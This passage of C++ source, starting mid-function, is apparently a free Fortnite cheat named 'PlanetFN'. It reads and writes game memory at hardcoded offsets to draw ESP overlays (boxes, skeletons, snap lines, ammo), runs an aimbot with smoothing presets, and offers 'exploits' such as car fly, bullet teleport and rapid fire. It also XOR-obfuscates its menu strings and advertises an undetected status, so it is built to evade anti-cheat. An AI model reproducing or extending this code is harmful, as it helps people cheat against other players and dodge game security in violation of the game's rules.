				} view = { 0 };
				uint64_t VEHICLE_STATS = read<uint64_t>(LocalPawn + 0x2200); //AFortPlayerPawn    CurrentVehicle    0x21b8    AActor *
				if (GetAsyncKeyState(VK_SPACE))write<char>(VEHICLE_STATS + 0x67a, 1);//AFortAthenaVehicle    bUseGravity : 1    	0x67a    char
			}
		}


	
			

		if (distance < VisDist)
		{
			if (Esp)
			{

				if (ThreeDBox && LocalPawn && PlayerController) {
					FBoxSphereBounds EntityBounds = read<FBoxSphereBounds>(CurrentActorMesh + 0x738); //USkinnedMeshComponent    CachedWorldSpaceBounds    0x738    FBoxSphereBounds

					auto v000 = EntityBounds.Origin - EntityBounds.BoxExtent;
					auto v111 = EntityBounds.Origin + EntityBounds.BoxExtent;

					// top box
					auto v010 = Vector3(v000.x, v111.y, v000.z);
					auto v110 = Vector3(v111.x, v111.y, v000.z);
					auto v011 = Vector3(v000.x, v111.y, v111.z);

					// bottom box
					auto v101 = Vector3(v111.x, v000.y, v111.z);
					auto v100 = Vector3(v111.x, v000.y, v000.z);
					auto v001 = Vector3(v000.x, v000.y, v111.z);

					auto w1 = ProjectWorldToScreen(Vector3(v000.x, v000.y, v000.z));
					auto w2 = ProjectWorldToScreen(Vector3(v111.x, v111.y, v111.z));

					auto s1 = ProjectWorldToScreen(v010);
					auto s2 = ProjectWorldToScreen(v110);
					auto s3 = ProjectWorldToScreen(v011);
					auto s4 = ProjectWorldToScreen(v101);
					auto s5 = ProjectWorldToScreen(v100);
					auto s6 = ProjectWorldToScreen(v001);

					if (s1.x || s1.y) {
						if (!isVisible(CurrentActorMesh))
						{
							DrawLine(w1.x, w1.y, s6.x, s6.y, &Col.white, 2.5);
							DrawLine(w1.x, w1.y, s5.x, s5.y, &Col.white, 2.5);
							DrawLine(s4.x, s4.y, s5.x, s5.y, &Col.white, 2.5);
							DrawLine(s4.x, s4.y, s6.x, s6.y, &Col.white, 2.5);

							DrawLine(s1.x, s1.y, s3.x, s3.y, &Col.white, 2.5);
							DrawLine(s1.x, s1.y, s2.x, s2.y, &Col.white, 2.5);
							DrawLine(w2.x, w2.y, s2.x, s2.y, &Col.white, 2.5);
							DrawLine(w2.x, w2.y, s3.x, s3.y, &Col.white, 2.5);

							DrawLine(s6.x, s6.y, s3.x, s3.y, &Col.white, 2.5);
							DrawLine(w1.x, w1.y, s1.x, s1.y, &Col.white, 2.5);
							DrawLine(s4.x, s4.y, w2.x, w2.y, &Col.white, 2.5);
							DrawLine(s5.x, s5.y, s2.x, s2.y, &Col.white, 2.5);
						}
						else {
							DrawLine(w1.x, w1.y, s6.x, s6.y, &Col.cyan, 2.5);
							DrawLine(w1.x, w1.y, s5.x, s5.y, &Col.cyan, 2.5);
							DrawLine(s4.x, s4.y, s5.x, s5.y, &Col.cyan, 2.5);
							DrawLine(s4.x, s4.y, s6.x, s6.y, &Col.cyan, 2.5);

							DrawLine(s1.x, s1.y, s3.x, s3.y, &Col.cyan, 2.5);
							DrawLine(s1.x, s1.y, s2.x, s2.y, &Col.cyan, 2.5);
							DrawLine(w2.x, w2.y, s2.x, s2.y, &Col.cyan, 2.5);
							DrawLine(w2.x, w2.y, s3.x, s3.y, &Col.cyan, 2.5);

							DrawLine(s6.x, s6.y, s3.x, s3.y, &Col.cyan, 2.5);
							DrawLine(w1.x, w1.y, s1.x, s1.y, &Col.cyan, 2.5);
							DrawLine(s4.x, s4.y, w2.x, w2.y, &Col.cyan, 2.5);
							DrawLine(s5.x, s5.y, s2.x, s2.y, &Col.cyan, 2.5);
						}
					}

					Esp_box = false;
					Esp_fbox = false;
				}

				if (reloadCheck)
				{
					if (bIsReloadingWeapon)
						ImGui::GetOverlayDrawList()->AddText(ImVec2(Headbox.x, Headbox.y + 30), IM_COL32(255, 0, 0, 255), "RELOADING");
					else
						ImGui::GetOverlayDrawList()->AddText(ImVec2(Headbox.x, Headbox.y + 30), IM_COL32(255, 0, 0, 255), "NOT RELOADING");
				}

				if (ammoESP)
				{
					char buffer[128];
					sprintf_s(buffer, "Ammo: %i", AmmoCount);


					if (AmmoCount < 100)
					{
						if (buffer != "?")
						{
							ImGui::GetOverlayDrawList()->AddText(ImVec2(Headbox.x, Headbox.y + 20), IM_COL32(0, 255, 0, 255), buffer);
						}
					}

					if (AmmoCount > 50)
					{
						if (buffer != "?")
						{
							ImGui::GetOverlayDrawList()->AddText(ImVec2(Headbox.x, Headbox.y + 20), IM_COL32(255, 128, 0, 255), buffer);
						}
					}
					if (AmmoCount > 30)
					{
						if (buffer != "?")
						{
							ImGui::GetOverlayDrawList()->AddText(ImVec2(Headbox.x, Headbox.y + 20), IM_COL32(255, 0, 0, 255), buffer);
						}
					}
					
				}

				if (Esp_box)
				{
					if (!isVisible(CurrentActorMesh))
					{
						// rgba(0, 255, 231, 0)
						DrawCorneredBox(Headbox.x - (CornerWidth / 2), Headbox.y, CornerWidth, CornerHeight, IM_COL32(0, 255, 231, 0), 2.5);
					}
					else {
						// rgba(0, 255, 231, 1)
						DrawCorneredBox(Headbox.x - (CornerWidth / 2), Headbox.y, CornerWidth, CornerHeight, IM_COL32(0, 255, 231, 1), 2.5);
					}

					Esp_fbox = false;
					ThreeDBox = false;
				}

				if (Esp_fbox)
				{
					if (!isVisible(CurrentActorMesh))
					{
						DrawBox(Headbox.x - (CornerWidth / 2), Headbox.y, CornerWidth, CornerHeight, &Col.white);
					}
					else {
						DrawBox(Headbox.x - (CornerWidth / 2), Headbox.y, CornerWidth, CornerHeight, &Col.cyan);
					}
					Esp_box = false;
					ThreeDBox = false;
				}

				if (Esp_Distance)
				{
					char dist[64];
					sprintf_s(dist, "Player | %.3f", distance);
					DrawOutlinedText(m_pFont, dist, ImVec2(Headbox.x + 35, Headbox.y + -4), 16.0f, IM_COL32(0, 255, 0, 255), true);
	
				}

				if (Esp_line)
				{
					if (!isVisible(CurrentActorMesh))
					{
						DrawLine(Width / 2 - 0, Height / 2 + 50, bottom.x, bottom.y, &Col.white, 2.5);
					}
					else {
						DrawLine(Width / 2 - 0, Height / 2 + 50, bottom.x, bottom.y, &Col.cyan, 2.5);
					}
				}
				if (Esp_Skeleton)
				{
					{

						Vector3 vHeadBoneOut, vNeckOut, vPelvisOut;
						Vector3 vUpperArmLeftOut, vLeftHandOut, vlowerarmLeftOut;
						Vector3 vUpperArmRightOut, vLowerarmRightOut, vRightHandOut;
						Vector3 vLeftThighOut, vLeftCalfOut, vLeftLballOut, vLeftFootOut;
						Vector3 vRightThighOut, vRightCalfOut, vRightLballut, vRightFootOut;

						Vector3 vHeadBone = GetBoneWithRotation(CurrentActorMesh, 68);
						vHeadBoneOut = ProjectWorldToScreen(vHeadBone);
						Vector3 vNeck = GetBoneWithRotation(CurrentActorMesh, 67);
						vNeckOut = ProjectWorldToScreen(vNeck);
						Vector3 vPelvis = GetBoneWithRotation(CurrentActorMesh, 2);
						vPelvisOut = ProjectWorldToScreen(vPelvis);

						Vector3 vLeftUpperArm = GetBoneWithRotation(CurrentActorMesh, 9);
						vUpperArmLeftOut = ProjectWorldToScreen(vLeftUpperArm);
						Vector3 vLeftlowerarm = GetBoneWithRotation(CurrentActorMesh, 10);
						vlowerarmLeftOut = ProjectWorldToScreen(vLeftlowerarm);
						Vector3 vLeftHand = GetBoneWithRotation(CurrentActorMesh, 11);
						vLeftHandOut = ProjectWorldToScreen(vLeftHand);

						Vector3 vRightUpperArm = GetBoneWithRotation(CurrentActorMesh, 38);
						vUpperArmRightOut = ProjectWorldToScreen(vRightUpperArm);
						Vector3 vRightLowerarm = GetBoneWithRotation(CurrentActorMesh, 39);
						vLowerarmRightOut = ProjectWorldToScreen(vRightLowerarm);
						Vector3 vRightHand = GetBoneWithRotation(CurrentActorMesh, 40);
						vRightHandOut = ProjectWorldToScreen(vRightHand);

						Vector3 vLeftThigh = GetBoneWithRotation(CurrentActorMesh, 69);
						vLeftThighOut = ProjectWorldToScreen(vLeftThigh);
						Vector3 vLeftCalf = GetBoneWithRotation(CurrentActorMesh, 70);
						vLeftCalfOut = ProjectWorldToScreen(vLeftCalf);
						Vector3 vLeftFoot = GetBoneWithRotation(CurrentActorMesh, 73);
						vLeftFootOut = ProjectWorldToScreen(vLeftFoot);
						Vector3 vLeftLball = GetBoneWithRotation(CurrentActorMesh, 74);
						vLeftLballOut = ProjectWorldToScreen(vLeftLball);

						Vector3 vRightThigh = GetBoneWithRotation(CurrentActorMesh, 76);
						vRightThighOut = ProjectWorldToScreen(vRightThigh);
						Vector3 vRightCalf = GetBoneWithRotation(CurrentActorMesh, 77);
						vRightCalfOut = ProjectWorldToScreen(vRightCalf);
						Vector3 vRightFoot = GetBoneWithRotation(CurrentActorMesh, 80);
						vRightFootOut = ProjectWorldToScreen(vRightFoot);
						Vector3 vRightLball = GetBoneWithRotation(CurrentActorMesh, 81);
						vRightLballut = ProjectWorldToScreen(vRightLball);

						DrawLine(vNeckOut.x, vNeckOut.y, vHeadBoneOut.x, vHeadBoneOut.y, &Col.white, 1.5);
						DrawLine(vPelvisOut.x, vPelvisOut.y, vNeckOut.x, vNeckOut.y, &Col.white, 1.5);

						DrawLine(vUpperArmLeftOut.x, vUpperArmLeftOut.y, vNeckOut.x, vNeckOut.y, &Col.white, 1.5);
						DrawLine(vUpperArmRightOut.x, vUpperArmRightOut.y, vNeckOut.x, vNeckOut.y, &Col.white, 1.5);

						DrawLine(vlowerarmLeftOut.x, vlowerarmLeftOut.y, vUpperArmLeftOut.x, vUpperArmLeftOut.y, &Col.white, 1.5);
						DrawLine(vLowerarmRightOut.x, vLowerarmRightOut.y, vUpperArmRightOut.x, vUpperArmRightOut.y, &Col.white, 1.5);

						DrawLine(vLeftHandOut.x, vLeftHandOut.y, vlowerarmLeftOut.x, vlowerarmLeftOut.y, &Col.white, 1.5);
						DrawLine(vRightHandOut.x, vRightHandOut.y, vLowerarmRightOut.x, vLowerarmRightOut.y, &Col.white, 1.5);

						DrawLine(vLeftThighOut.x, vLeftThighOut.y, vPelvisOut.x, vPelvisOut.y, &Col.white, 1.5);
						DrawLine(vRightThighOut.x, vRightThighOut.y, vPelvisOut.x, vPelvisOut.y, &Col.white, 1.5);

						DrawLine(vLeftCalfOut.x, vLeftCalfOut.y, vLeftThighOut.x, vLeftThighOut.y, &Col.white, 1.5);
						DrawLine(vRightCalfOut.x, vRightCalfOut.y, vRightThighOut.x, vRightThighOut.y, &Col.white, 1.5);

						DrawLine(vLeftFootOut.x, vLeftFootOut.y, vLeftCalfOut.x, vLeftCalfOut.y, &Col.white, 1.5);
						DrawLine(vRightFootOut.x, vRightFootOut.y, vRightCalfOut.x, vRightCalfOut.y, &Col.white, 1.5);

						DrawLine(vLeftFootOut.x, vLeftFootOut.y, vLeftLballOut.x, vLeftLballOut.y, &Col.white, 1.5);
						DrawLine(vRightFootOut.x, vRightFootOut.y, vRightLballut.x, vRightLballut.y, &Col.white, 1.5);
					}
				}

			}
		}

		auto dx = w2shead.x - (Width / 2);
		auto dy = w2shead.y - (Height / 2);
		auto dist = sqrtf(dx * dx + dy * dy);

		if (isVisible(CurrentActorMesh)) {

			if (dist < AimFOV && dist < closestDistance) {
				closestDistance = dist;
				closestPawn = CurrentActor;

			}
		}



	}
	if (Aimbot)
	{
		if (Aimbot && closestPawn && GetAsyncKeyState(hotkeys::aimkey) < 0 or Controller::IsPressingLeftTrigger()) {
			AimAt(closestPawn);
		}
	}
	Sleep(1);
}

void render() {

	if (GetAsyncKeyState(VK_INSERT) & 1) {
		ShowMenu = !ShowMenu;
	}

	ImGui_ImplDX9_NewFrame();
	ImGui_ImplWin32_NewFrame();
	ImGui::NewFrame();


	

	if (ShowMenu)
	{
		XorS(menu, "PlanetFN");
		XorS(enable_esp, "Enable Esp");
		XorS(box_esp, "2D Cornered Boxes");
		XorS(fullboxesp, "2D Normal Boxes");
		XorS(snapline, "Snap Lines");
		XorS(espdis, "Esp Distance");
		XorS(espvis, "Esp Visable");
		XorS(es5, "Max Visuals Distance");
		XorS(espskel, "Skeletons");

		XorS(aim1, "Aimbot");
		XorS(aim2, "Aimbot Key");
		XorS(aim3, "Aimbot Bone");
		XorS(aim7, "Enable FOV");
		XorS(aim6, "Aimbot FOV");


		ImGui::SetNextWindowSize(ImVec2(400.000f, 380.000f), ImGuiCond_Once);
		ImGui::Begin("", NULL, 59);




		ImGui::Spacing();
		ImGui::Spacing();
		ImGui::SetCursorPos(ImVec2(65.000f, 20.000f));
		ImGui::Text("PlanetFN Free Cheat | Paid = Scammed");
		static int switchTabs = 1;

		if (showStats)
		{
			ImGui::SetNextWindowSize(ImVec2(300.000f, 200.000f), ImGuiCond_Once);
			if (!ImGui::Begin("Cheat Menu Stats", NULL, 59))
			{
				ImGui::End();
				return;
			}
			ImGui::Spacing();
			ImGui::Text("Version Of PlanetFN: 1.7");
			ImGui::Spacing();
			ImGui::Text("Status: UD");
			ImGui::Spacing();
			ImGui::Text("FPS : %i", ImGui::GetIO().Framerate);
			ImGui::Spacing();
			ImGui::Text("Cheat Type: Free");
			ImGui::End();
		}

		ImGui::SetCursorPos(ImVec2(22.000f, 86.000f));
		if (ImGui::Button("Aim", ImVec2(85.000f, 25.000f)))
			switchTabs = 0;

		ImGui::SameLine();
		if (ImGui::Button("Visuals", ImVec2(85.000f, 25.000f)))
			switchTabs = 1;

		ImGui::SameLine();
		if (ImGui::Button("Misc", ImVec2(85.000f, 25.000f)))
			switchTabs = 2;

		ImGui::SameLine();
		if (ImGui::Button("Settings", ImVec2(85.000f, 25.000f)))
			switchTabs = 3;
	

		ImGui::Spacing();
		ImGui::Spacing();


	switch (switchTabs) {
	 case 0:
		ImGui::Checkbox(aim1.decrypt(), &Aimbot);
		ImGui::Spacing();
		ImGui::Checkbox(aim7.decrypt(), &fovCircle);
		//ImGui::Spacing();
		//ImGui::Checkbox("Silent", &silent);
		ImGui::Spacing();
		ImGui::SliderInt(aim6.decrypt(), &AimFOV, 25.f, 1500.f);
		ImGui::Spacing();
		ImGui::SliderInt("Player Render", &VisDist, 20, 500);
		ImGui::Spacing();
		ImGui::SliderFloat("Aimbot Smooth", &bA1mb0tSm00th1ngV4lue, 2.5f, 15.f);
		ImGui::Spacing();
		ImGui::Combo(aim3.decrypt(), &hitboxpos, hitboxes, sizeof(hitboxes) / sizeof(*hitboxes));
		ImGui::Spacing();
		ImGui::Text("Aim Key");
		HotkeyButton(hotkeys::aimkey, ChangeKey, keystatus);
		//ImGui::Combo(aim2.decrypt(), &aimkeypos, aimkeys, sizeof(aimkeys) / sizeof(*aimkeys));
		break;
	 case 1:
		ImGui::Checkbox(enable_esp.decrypt(), &Esp);
		ImGui::SameLine();
		ImGui::Checkbox(box_esp.decrypt(), &Esp_box);
		ImGui::Spacing();
		ImGui::Checkbox(fullboxesp.decrypt(), &Esp_fbox);
		ImGui::SameLine();
		ImGui::Checkbox(espdis.decrypt(), &Esp_Distance);
		ImGui::Spacing();
		ImGui::Checkbox(snapline.decrypt(), &Esp_line);
		ImGui::SameLine();
		ImGui::Checkbox(espskel.decrypt(), &Esp_Skeleton);
		ImGui::Spacing();
		ImGui::Checkbox("3D Boxes", &ThreeDBox);
		ImGui::SameLine();
		ImGui::Checkbox("Ammo ESP", &ammoESP);
		ImGui::Spacing();
		ImGui::Checkbox("Reload Check", &reloadCheck);
		ImGui::SameLine();
		ImGui::Checkbox("Cross Hair", &crossHair);
		ImGui::Spacing();
		//ImGui::Checkbox("PlayerName", &playerName);
		break;
	 case 2:
		 if(Safemode == true)
		 {
			 ImGui::Spacing();
			 ImGui::Spacing();
			 ImGui::Spacing();
			 ImGui::Text("SafeMode Is On So Expolits Will Not Be Here!");
			 InstaRes = false;
			 AirStuck = false;
			 AimWhileJumping = false;
			 spinbot = false;
			 carFly = false;
			 NoBloom = false;
			 bullettp = false;
			 instaReboot = false;
		 }
		 else {
			 ImGui::Spacing();
			 ImGui::Spacing();
			 ImGui::Spacing();
			 ImGui::Checkbox("Instant Revive", &InstaRes);
			 ImGui::SameLine();
			 ImGui::Checkbox("Air Stuck", &AirStuck);
			 ImGui::Spacing();
			 ImGui::Checkbox("Aim While Jumping", &AimWhileJumping);
			 ImGui::SameLine();
			 ImGui::Checkbox("Spinbot", &spinbot);
			 ImGui::Spacing();
			 ImGui::Checkbox("Car Fly", &carFly);
			 ImGui::SameLine();
			 ImGui::Checkbox("Rapid Fire", &NoBloom);
			 ImGui::Spacing();
			 ImGui::Checkbox("Bullet TP", &bullettp);
			 ImGui::SameLine();
			 ImGui::Checkbox("Instant Reboot", &instaReboot);
		 }
		break;
	 case 3:
		 ImGui::Spacing();
		 ImGui::Spacing();
		 ImGui::Checkbox("Safemode (If You Disable Could Mean Chance Of Ban!)", &Safemode);
		 ImGui::Spacing();
		 ImGui::Checkbox("FPS Counter", &fpsCounter);
		 ImGui::Spacing();
		 ImGui::Checkbox("Dev Window", &showStats);
		 ImGui::Spacing();
		 if (ImGui::Button("Rage", ImVec2(85.000f, 25.000f)))
		 {
			 bA1mb0tSm00th1ngV4lue = 2.5;
			 aimDist = 250;
			 AimFOV = 95;
		 }
		 ImGui::SameLine();
		 if (ImGui::Button("Semi Legit", ImVec2(85.000f, 25.000f)))
		 {
			 bA1mb0tSm00th1ngV4lue = 4.5;
			 aimDist = 300;
			 AimFOV = 115;
		 }
		 ImGui::SameLine();
		 if (ImGui::Button("Legit", ImVec2(85.000f, 25.000f)))
		 {
			 bA1mb0tSm00th1ngV4lue = 6;
			 aimDist = 300;
			 AimFOV = 67;
		 }
		 break;
	}
	ImGui::End();
	};
	
	DrawESP();

	ImGui::EndFrame();
	D3dDevice->SetRenderState(D3DRS_ZENABLE, false);
	D3dDevice->SetRenderState(D3DRS_ALPHABLENDENABLE, false);
	D3dDevice->SetRenderState(D3DRS_SCISSORTESTENABLE, false);
	D3dDevice->Clear(0, NULL, D3DCLEAR_TARGET, D3DCOLOR_ARGB(0, 0, 0, 0), 1.0f, 0);

	if (D3dDevice->BeginScene() >= 0)
	{
		ImGui::Render();
		ImGui_ImplDX9_RenderDrawData(ImGui::GetDrawData());
		D3dDevice->EndScene();
	}
	HRESULT result = D3dDevice->Present(NULL, NULL, NULL, NULL);

	if (result == D3DERR_DEVICELOST && D3dDevice->TestCooperativeLevel() == D3DERR_DEVICENOTRESET)
	{
		ImGui_ImplDX9_InvalidateDeviceObjects();
		D3dDevice->Reset(&d3dpp);
		ImGui_ImplDX9_CreateDeviceObjects();
	}
}


MSG Message = { NULL };

void xMainLoop()
{
	static RECT old_rc;
	ZeroMemory(&Message, sizeof(MSG));

	while (Message.message != WM_QUIT)
	{
		if (PeekMessage(&Message, Window, 0, 0, PM_REMOVE))
		{
			TranslateMessage(&Message);
			DispatchMessage(&Message);
		}

		HWND hwnd_active = GetForegroundWindow();

		if (hwnd_active == hwnd) {
			HWND hwndtest = GetWindow(hwnd_active, GW_HWNDPREV);
			SetWindowPos(Window, hwndtest, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
		}

		if (GetAsyncKeyState(0x23) & 1)
			exit(8);

		RECT rc;
		POINT xy;

		ZeroMemory(&rc, sizeof(RECT));
		ZeroMemory(&xy, sizeof(POINT));
		GetClientRect(hwnd, &rc);
		ClientToScreen(hwnd, &xy);
		rc.left = xy.x;
		rc.top = xy.y;

		ImGuiIO& io = ImGui::GetIO();
		io.ImeWindowHandle = hwnd;
		io.DeltaTime = 1.0f / 60.0f;

		POINT p;
		GetCursorPos(&p);
		io.MousePos.x = p.x - xy.x;
		io.MousePos.y = p.y - xy.y;

		if (GetAsyncKeyState(VK_LBUTTON)) {
			io.MouseDown[0] = true;
			io.MouseClicked[0] = true;
			io.MouseClickedPos[0].x = io.MousePos.x;
			io.MouseClickedPos[0].x = io.MousePos.y;
		}
		else
			io.MouseDown[0] = false;

		if (rc.left != old_rc.left || rc.right != old_rc.right || rc.top != old_rc.top || rc.bottom != old_rc.bottom)
		{
			old_rc = rc;

			Width = rc.right;
			Height = rc.bottom;

			d3dpp.BackBufferWidth = Width;
			d3dpp.BackBufferHeight = Height;
			SetWindowPos(Window, (HWND)0, xy.x, xy.y, Width, Height, SWP_NOREDRAW);
			D3dDevice->Reset(&d3dpp);
		}
		render();
	}
	ImGui_ImplDX9_Shutdown();
	ImGui_ImplWin32_Shutdown();
	ImGui::DestroyContext();

	DestroyWindow(Window);
}

LRESULT CALLBACK WinProc(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)
{
	if (ImGui_ImplWin32_WndProcHandler(hWnd, Message, wParam, lParam))
		return true;

	switch (Message)
	{
	case WM_DESTROY:
		xShutdown();
		PostQuitMessage(0);
		exit(4);
		break;
	case WM_SIZE:
		if (D3dDevice != NULL && wParam != SIZE_MINIMIZED)
		{
			ImGui_ImplDX9_InvalidateDeviceObjects();
			d3dpp.BackBufferWidth = LOWORD(lParam);
			d3dpp.BackBufferHeight = HIWORD(lParam);
			HRESULT hr = D3dDevice->Reset(&d3dpp);
			if (hr == D3DERR_INVALIDCALL)
				IM_ASSERT(0);
			ImGui_ImplDX9_CreateDeviceObjects();
		}
		break;
	default:
		return DefWindowProc(hWnd, Message, wParam, lParam);
		break;
	}
	return 0;
}

void xShutdown()
{
	TriBuf->Release();
	D3dDevice->Release();
	p_Object->Release();

	DestroyWindow(Window);
	UnregisterClass("fgers", NULL);
} 
